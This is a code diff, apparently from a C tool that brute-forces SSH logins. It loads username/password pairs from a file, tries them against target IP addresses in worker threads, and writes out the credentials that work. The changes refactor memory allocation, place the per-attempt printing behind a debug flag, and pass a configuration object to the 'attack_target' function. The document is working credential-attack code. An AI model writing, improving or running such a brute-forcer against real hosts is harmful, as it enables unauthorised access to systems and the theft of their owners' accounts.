@@ -7,20 +7,31 @@
 struct stat sb;
 
 /**
+ * Returns minimum of two numbers.
+ * @param number1
+ * @param number2
+ * @return
+ */
+int min(int number1, int number2) {
+    return number1 < number2 ? number1 : number2;
+}
+
+/**
  * The t_login_combination constructor
  * @param user
  * @param pass
  * @return
  */
 t_login_combination *t_combination_create(char *user, char *pass) {
+    unsigned int userL = strlen(user);
+    unsigned int passL = strlen(pass);
     t_login_combination *p = malloc(sizeof(t_login_combination));
-    int len;
-    len = strlen(user);
-    strncpy(p->username, user, len);
-    p->username[len] = '\0';
-    len = strlen(pass);
-    strncpy(p->password, pass, len);
-    p->password[len] = '\0';
+    p->username = malloc((userL + 1));
+    p->password = malloc((passL + 1));
+    strncpy(p->username, user, userL);
+    strncpy(p->password, pass, passL);
+    p->username[userL] = '\0';
+    p->password[passL] = '\0';
     return p;
 }
 
@@ -32,9 +43,20 @@ t_login_combination *t_combination_create(char *user, char *pass) {
  */
 t_ip_address *t_ipaddress_create(char *ipaddr) {
     t_ip_address *p = malloc(sizeof(t_ip_address));
-    int len = strlen(ipaddr);
+    unsigned int len = strlen(ipaddr);
     strncpy(p->ip, ipaddr, len);
     p->ip[len] = '\0';
+    return p;
+}
+
+/**
+ * The thread data object create
+ * @param ip_addresses
+ * @param combinations
+ * @return
+ */
+t_config *t_config_create() {
+    t_config *p = malloc(sizeof(t_config));
     return p;
 }
 
@@ -184,19 +206,18 @@ list_t *get_user_pass_combinations() {
     char *filename = "pass_file";
     FILE *file = fopen(filename, "r");
 
-    char user[255] = {'\0'};
-    char pass[255] = {'\0'};
     list_t *combinations = list_new();
 
     if (file != NULL) {
         while (1) {
+            char user[255] = {'\0'};
+            char pass[255] = {'\0'};
             int ret = fscanf(file, "%s %s\n", user, pass);
             if (ret == 2) {
                 t_login_combination *c = t_combination_create(user, pass);
                 list_node_t *node = list_node_new(c);
                 list_rpush(combinations, node);
                 //printf("Username: %s, Password: %s\n", c->username, c->password);
-
             } else if (errno != 0) {
                 continue;
             } else {
@@ -250,22 +271,31 @@ int ssh_auth(char *username, char *password, char *host) {
 /**
  * Attack target
  * @param ip_object
- * @param combination
+ * @param config
  */
-void attack_target(t_ip_address * ip_object, list_t * combinations) {
+void attack_target(t_ip_address *ip_object, t_config *config) {
 
+    list_t *combinations = get_user_pass_combinations();
     list_node_t *node;
     list_iterator_t *it = list_iterator_new(combinations, LIST_HEAD);
     while ((node = list_iterator_next(it))) {
         t_login_combination *c = (t_login_combination *) node->val;
-        printf("Checking Username: %s, Password: %s for %s\n", c->username, c->password, ip_object->ip);
+        if (config->debug) {
+            printf("Checking: %s:%s -> %s\n", c->username, c->password, ip_object->ip);
+        }
         int result = ssh_auth(c->username, c->password, ip_object->ip);
         if (result) {
-            printf("Success: %s %s %s\n", c->username, c->password, ip_object->ip);
+            if (config->debug) {
+                printf("Success: %s:%s -> %s\n", c->username, c->password, ip_object->ip);
+            }
             write_auth_details(c->username, c->password, ip_object->ip);
         }
     }
     list_iterator_destroy(it);
+    if (combinations) {
+        list_destroy(combinations);
+    }
+
 }
 
 /**
@@ -276,8 +306,8 @@ void attack_target(t_ip_address * ip_object, list_t * combinations) {
 void process_chunk(void *t_data) {
     // Store the value argument passed to this thread
     t_thread_data *data = (t_thread_data *) t_data;
-    if (data->combinations->len > 0) {
-        attack_target(data->ip_address, data->combinations);
+    if (data->ip_address) {
+        attack_target(data->ip_address, data->config);
     } else {
         write_log("No valid data assigned to the thread");
     }
